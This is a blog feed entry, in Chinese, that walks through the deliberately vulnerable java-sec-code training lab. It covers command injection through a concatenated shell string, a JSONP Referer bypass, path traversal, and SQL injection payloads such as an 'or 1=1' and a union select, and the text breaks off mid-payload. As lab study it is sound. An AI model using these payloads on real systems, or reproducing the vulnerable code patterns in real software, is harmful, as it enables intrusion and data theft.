{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "subtitle": "",
    "icon": "http://odiws.github.io/images/favicon.ico",
    "description": "",
    "home_page_url": "http://odiws.github.io",
    "items": [
        {
            "id": "http://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/",
            "url": "http://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/",
            "title": "java-sec-code复现",
            "date_published": "2025-07-08T01:11:15.000Z",
            "content_html": "<h1 id=\"java-sec-code靶场复现\"><a class=\"anchor\" href=\"#java-sec-code靶场复现\">#</a> java-sec-code 靶场复现：</h1>\n<p>搭建：这是有个 springboot 项目，直接打开这个项目运行即可</p>\n<p>记得配置配置文件 application.properties 这个文件的 jdbc 的账号和密码记得换成自己的账号密码</p>\n<p>在配置文件周围有个 create_db.sql</p>\n<p>记得先创建这个库，再是运行里面的内容</p>\n<p>再是登录就是下面的页面</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081550679.png\" alt=\"image-20250708154917318\" /></p>\n<h2 id=\"cmdinject\"><a class=\"anchor\" href=\"#cmdinject\">#</a> Cmdinject</h2>\n<h3 id=\"codeinject\"><a class=\"anchor\" href=\"#codeinject\">#</a> /codeinject</h3>\n<p>接下来就是复现这个漏洞了，审计源代码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/codeinject\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">codeInject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> filepath<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cmdList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ls -la \"</span> <span class=\"token operator\">+</span> filepath<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ProcessBuilder</span> builder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span>cmdList<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        builder<span class=\"token punctuation\">.</span><span class=\"token function\">redirectErrorStream</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token class-name\">WebUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">convertStreamToString</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个是相关的代码：至于怎么知道的就是找这个路由是 / 从的 inject，源代码全局搜索就好了</p>\n<p>里面有个类看一下构造函数：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081554563.png\" alt=\"image-20250708155423524\" /></p>\n<p>可以发现他将我们的命令加入到 this.command 里面来了（是按 arraylist 储存起来），</p>\n<p>执行了 redirectErrorStream 这个函数，看一下他的含义</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">ProcessBuilder</span> <span class=\"token function\">redirectErrorStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> redirectErrorStream<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>redirectErrorStream <span class=\"token operator\">=</span> redirectErrorStream<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>将 builder 自己的 redirectErrorStream 换成传入的参数</p>\n<h4 id=\"start函数详解\"><a class=\"anchor\" href=\"#start函数详解\">#</a> start（）函数详解：</h4>\n<h5 id=\"1-把命令参数转换为字符串数组\"><a class=\"anchor\" href=\"#1-把命令参数转换为字符串数组\">#</a> 1. 把命令参数转换为字符串数组</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cmdarray <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span>command<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cmdarray <span class=\"token operator\">=</span> cmdarray<span class=\"token punctuation\">.</span><span class=\"token function\">clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>把用户传入的命令（通常是一个 List&lt;String&gt;）转换成数组形式，并且克隆一份，防止外部引用被修改（安全性考虑）。</li>\n</ul>\n<hr />\n<h5 id=\"2-参数检查\"><a class=\"anchor\" href=\"#2-参数检查\">#</a> 2. 参数检查</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> arg <span class=\"token operator\">:</span> cmdarray<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>arg <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>确保命令数组中的每个参数都不是  <code>null</code> ，否则抛出异常。</li>\n</ul>\n<hr />\n<h5 id=\"3-获取要执行的程序名命令第一个元素\"><a class=\"anchor\" href=\"#3-获取要执行的程序名命令第一个元素\">#</a> 3. 获取要执行的程序名（命令第一个元素）</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span> prog <span class=\"token operator\">=</span> cmdarray<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>取数组的第一个元素作为要执行的程序或命令。</li>\n</ul>\n<hr />\n<h5 id=\"4-安全管理器检查\"><a class=\"anchor\" href=\"#4-安全管理器检查\">#</a> 4. 安全管理器检查</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">SecurityManager</span> security <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSecurityManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>security <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    security<span class=\"token punctuation\">.</span><span class=\"token function\">checkExec</span><span class=\"token punctuation\">(</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>如果有安全管理器，检查是否允许执行这个程序。</li>\n<li>这是 Java 的安全策略部分，用于限制敏感操作。</li>\n</ul>\n<hr />\n<h5 id=\"5-获取执行目录路径\"><a class=\"anchor\" href=\"#5-获取执行目录路径\">#</a> 5. 获取执行目录路径</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span> dir <span class=\"token operator\">=</span> directory <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">:</span> directory<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>如果指定了工作目录，就转成字符串路径，否则为  <code>null</code> 。</li>\n</ul>\n<hr />\n<h5 id=\"6-检查命令参数中是否含有非法的空字符\"><a class=\"anchor\" href=\"#6-检查命令参数中是否含有非法的空字符\">#</a> 6. 检查命令参数中是否含有非法的空字符</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s <span class=\"token operator\">:</span> cmdarray<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">'\\u0000'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invalid null character in command\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>如果命令中包含空字符  <code>\\0</code> ，抛出异常，这通常是非法命令参数。</li>\n</ul>\n<hr />\n<h5 id=\"7-启动进程\"><a class=\"anchor\" href=\"#7-启动进程\">#</a> 7. 启动进程</h5>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token class-name\">ProcessImpl</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span>cmdarray<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                             environment<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                             dir<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                             redirects<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                             redirectErrorStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>真正调用底层的  <code>ProcessImpl.start()</code>  方法启动进程，传入命令参数、环境变量、工作目录、重定向设置等。</li>\n<li>如果启动失败，会捕获异常。</li>\n</ul>\n<hr />\n<ol start=\"8\">\n<li>异常处理和安全相关异常信息屏蔽</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>e <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> security <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        security<span class=\"token punctuation\">.</span><span class=\"token function\">checkRead</span><span class=\"token punctuation\">(</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">SecurityException</span> se<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        exceptionInfo <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        cause <span class=\"token operator\">=</span> se<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"Cannot run program \\\"\"</span> <span class=\"token operator\">+</span> prog <span class=\"token operator\">+</span> <span class=\"token string\">\"\\\"\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>dir <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\" (in directory \\\"\"</span> <span class=\"token operator\">+</span> dir <span class=\"token operator\">+</span> <span class=\"token string\">\"\\\")\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token operator\">+</span> exceptionInfo<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    cause<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>如果启动失败，尝试用安全管理器判断是否有权限读取该程序文件，如果没有权限，则隐藏具体错误信息。</li>\n<li>抛出一个新的  <code>IOException</code> ，包含更友好的错误描述。</li>\n</ul>\n<p>process.getInputStream () 函数返回一个 InputStream，用于读取子进程的标准输出（stdout）。返回的就是执行的结果</p>\n<p>然后就是 WebUtils.convertStreamToString</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">convertStreamToString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InputStream</span> is<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span>Scanner</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span>Scanner</span><span class=\"token punctuation\">(</span>is<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">useDelimiter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\\A\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个函数就是将其输出出来（使用了 scanner 类来读取 InputStream 类，让  <code>Scanner</code>  使用 <strong>输入开头</strong> ( <code>\\A</code> ) 作为分隔符，这样整个流的内容会被当作一个整体读取（一次性读完整个流），s.next 返回整个输入流的字符串内容，如果流是空的返回 “”）</p>\n<h3 id=\"codeinjecthost\"><a class=\"anchor\" href=\"#codeinjecthost\">#</a> /codeinject/host</h3>\n<p>差不多：只是将文件输入转成了 request 的 http 的 host 头了</p>\n<p>但是发现用 bp 和 hackbar 都不行就离谱，只能用 curl 才能传，</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081637096.png\" alt=\"image-20250708163749860\" /></p>\n<p>作者解释：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pveUNob3U5My9qYXZhLXNlYy1jb2RlL2lzc3Vlcy83OA==\">https://github.com/JoyChou93/java-sec-code/issues/78</span></p>\n<h2 id=\"jsonp\"><a class=\"anchor\" href=\"#jsonp\">#</a> jsonp</h2>\n<p>解释：前端目标：从其他域名请求数据（绕过同源策略）</p>\n<p>浏览器限制 Ajax（比如 fetch/XMLHttpRequest）不能跨与调用 API，比如：</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 这是不能跨域的</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://api.othersite.com/user\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">// ❌ 被浏览器拦截</span></pre></td></tr></table></figure><p>・意思就是前端定义一手函数，包含怎么处理数据什么的，然后通过 script 标签回调一个函数，这样后端就会知道这个是 JSONP 数据，需要返回一个函数一个的数据，然后跟我前端定义的函数结构是一样的，前端就可以接受数据进行处理就行了</p>\n<p>自动添加为 JSONP 代码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@ControllerAdvice</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JSONPAdvice</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractJsonpResponseBodyAdvice</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">JSONPAdvice</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"callback\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cback\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//callback 的参数名，可以为多个</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 java-sec-code 里面是</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Object2Jsonp</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractJsonpResponseBodyAdvice</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> callbacks<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Logger</span> logger<span class=\"token operator\">=</span> <span class=\"token class-name\">LoggerFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">getLogger</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// method of using @Value in constructor</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object2Jsonp</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;joychou.security.jsonp.callback&#125;\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> callbacks<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>callbacks<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Can set multiple paramNames</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>callbacks <span class=\"token operator\">=</span> callbacks<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以通过 AbstractJsonpResponseBodyAdvice 这个关键字寻找，得先找到 callback 的参数名字才行，就是 ${joychou.security.jsonp.callback} 这个</p>\n<p>拿到这个函数，然后就是有个 security 的绕过，要求 referer 必要时 Joychou.org 并且得是 http/https 开头的，用</p>\n<pre><code>Referer: https://joychou.org\n</code></pre>\n<p>绕过</p>\n<p>其他的感觉太老了，没必要深究，了解其原理就好了</p>\n<h2 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传：</h2>\n<p>目前这类漏洞在 spring 里非常少，原因有两点：</p>\n<ol>\n<li>大多数公司上传的文件都会到 cdn</li>\n<li>spring 的 jsp 文件必须在 web-inf 目录下才能执行</li>\n</ol>\n<p>除非，可以上传 war 包到 tomcat 的 webapps 目录。所以就不 YY 写漏洞了。</p>\n<p>访问 <code>http://localhost:8080/file/</code>  进行文件上传，上传成功后，再访问 <code>http://localhost:8080/image/上传的文件名</code> 可访问上传后的文件。</p>\n<h2 id=\"目录穿越\"><a class=\"anchor\" href=\"#目录穿越\">#</a> 目录穿越</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/path_traversal/sec\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getImageSec</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> filepath<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">SecurityUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">pathFilter</span><span class=\"token punctuation\">(</span>filepath<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        logger<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal file path: \"</span> <span class=\"token operator\">+</span> filepath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Bad boy. Illegal file path.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">getImgBase64</span><span class=\"token punctuation\">(</span>filepath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>给了 filepath 文件地址，直接../ 加文件地址就有了<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507081920614.png\" alt=\"image-20250708192005270\" /></p>\n<h2 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h2>\n<h4 id=\"raw-sql\"><a class=\"anchor\" href=\"#raw-sql\">#</a> raw sql</h4>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 手拼 raw sql</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Statement</span> statement <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">createStatement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">String</span> sql <span class=\"token operator\">=</span> <span class=\"token string\">\"select * from users where username = '\"</span> <span class=\"token operator\">+</span> username <span class=\"token operator\">+</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">ResultSet</span> rs <span class=\"token operator\">=</span> statement<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>jdbc<span class=\"token operator\">/</span>vuln<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>joychou' or <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><p>还可以联合注入继续 SQL 注入：</p>\n<p>0' or 1=1 union select 1,database(),3 